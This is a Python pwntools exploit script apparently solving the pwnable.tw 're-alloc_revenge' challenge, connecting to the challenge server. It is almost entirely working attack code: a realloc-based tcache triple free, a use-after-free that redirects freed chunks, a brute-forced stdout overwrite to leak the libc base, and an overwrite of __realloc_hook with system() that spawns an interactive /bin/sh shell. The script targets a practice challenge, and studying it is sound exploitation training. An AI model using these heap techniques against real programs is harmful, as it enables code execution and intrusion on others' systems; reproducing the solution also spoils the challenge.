#!/usr/bin/env python3

from pwn import *

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\0"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
A = lambda len=1, c=b'A': c * len
z = lambda len=1, c=b'\0': c * len

exe = ELF("re-alloc_revenge_patched", checksec=False)
libc = ELF("./libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so", checksec=False)
ld = ELF("./ld-2.29.so", checksec=False)

context.terminal = ["/usr/bin/tilix", "-a", "session-add-right", "-e", "bash", "-c"]
context.binary = exe

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
set follow-fork-mode parent
set detach-on-fork on

continue
'''

def conn():
    if args.LOCAL:
        p = process([exe.path])
        sleep(0.25)
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            sleep(1)
        return p
    else:
        host = "chall.pwnable.tw"
        port = 10310
        return remote(host, port)

def alloc(index, size, data=b'A'):
    slan(p, b'choice', 1)
    slan(p, b'Index', index)
    slan(p, b'Size', size)
    sa(p, b'Data', data)

def realloc(index, size, data=b'A'):
    slan(p, b'choice', 2)
    slan(p, b'Index', index)
    slan(p, b'Size', size)
    if size:
        sa(p, b'Data', data)

def rfree(index):
    slan(p, b'choice', 3)
    slan(p, b'Index', index)

attempt = 0
while True:
    attempt += 1
    print("\n----------> Attempt", attempt)
    p = conn()

    # Save address to tcache bin 0x80
    print("Save address of first and second malloc")
    alloc(0, 0x70, flat(z(0x58), 0x81))
    alloc(1, 0x70)
    rfree(0)
    rfree(1)

    # Heap spray to have valid metadata for unsortedbin free
    print("Heap spray")
    alloc(0, 0x50, b'A')
    realloc(0, 0x30, b'A')
    for i in range(10):
        realloc(0, 0x50, flat(z(0x28), 0x71))
        realloc(0, 0x30, b'A')
    rfree(0)

    # For later usage (*)
    alloc(0, 0x60)
    rfree(0)

    print("Take back address")
    alloc(0, 0x70)
    alloc(1, 0x70)

    print("Triple free")
    realloc(1, 0)
    realloc(1, 0x70, z(0x10))
    realloc(1, 0)
    realloc(1, 0x70, z(0x10))
    realloc(1, 0)

    print("UAF to overwrite last byte of fd to 0xc0")
    offset = 0xd0 - 0x10
    realloc(1, 0x70, p8(offset))

    print("Clear index 0")
    realloc(0, 0x50)
    rfree(0)

    print("Fix fastbin to clear index 1")
    alloc(0, 0x70)
    realloc(0, 0x20)
    rfree(0)

    print("Clear index 1")
    realloc(1, 0x20, z(0x10))
    rfree(1)

    print("Overlap chunk to be placed in tcache bin and unsorted bin")
    alloc(1, 0x50)
    alloc(0, 0x70)
    print("Free index 1 to tcache bin")
    realloc(1, 0)
    realloc(1, 0x50, z(0x10))
    print("Fake chunk size and free to unsorted bin")
    realloc(0, 0x70, flat(z(0x18), 0x421))
    realloc(1, 0)

    print("Overwrite fd to point to stdout (1/16 chance)")
    realloc(1, 0x50, p16(0x2760))

    print("Clear index 0")
    realloc(0, 0x40)
    rfree(0)

    print("Take one chunk from tcache bin 0x60, stdout ready for allocation")
    alloc(0, 0x50, z(0x10))

    print("Clear index 0")
    realloc(0, 0x10)
    rfree(0)

    print("Fix fastbin again to clear index 1")
    alloc(0, 0x10)
    realloc(0, 0)
    realloc(0, 0x10, z(0x10))
    realloc(0, 0)
    print("Clear index 1")
    rfree(1)
    rfree(0)

    print("Trying to leak libc")
    flags = 0xfbad1800
    try:
        print("Overwrite stdout")
        alloc(0, 0x50, flat(flags, z(0x18 + 1)))

        print("Wait for data leak")
        p.recvuntil(p64(flags), timeout=0.5)
        rn(p, 32)
        libc.address = leak_bytes(rn(p, 6), 0x1e57e3)
        lg("libc base", libc.address)
        if libc.address & 0xfff != 0:
            print("Wrong libc base")
            p.close()
            continue
    except:
        print("Failed to leak libc")
        p.close()
        continue

    print("Clear index 1")
    alloc(1, 0x60) # (*) so later the index can be cleared easier
    realloc(1, 0)
    realloc(1, 0x10, z(0x10))
    rfree(1)

    print("Fix fastbin again to clear index 1")
    alloc(1, 0x10)
    realloc(1, 0)
    realloc(1, 0x10, z(0x10))
    rfree(1)

    print("Overwrite fd to realloc hook - 0x10")
    realloc_hook = libc.symbols['__realloc_hook']
    lg("realloc hook", realloc_hook)
    alloc(1, 0x60, flat(z(0x18), 0x51, realloc_hook - 0x10))
    rfree(1)

    print("Clear index 1")
    alloc(1, 0x40)
    realloc(1, 0x10)
    rfree(1)

    print("Allocate to index 1 and write /bin/sh + system() to __realloc_hook-0x10")
    system = libc.symbols['system']
    lg("system", system)
    alloc(1, 0x40, flat(b'/bin/sh\0', 0, system))

    print("Free index 1 to spawn shell:")
    rfree(1)

    rr(p, 0.5)
    ia(p)
    break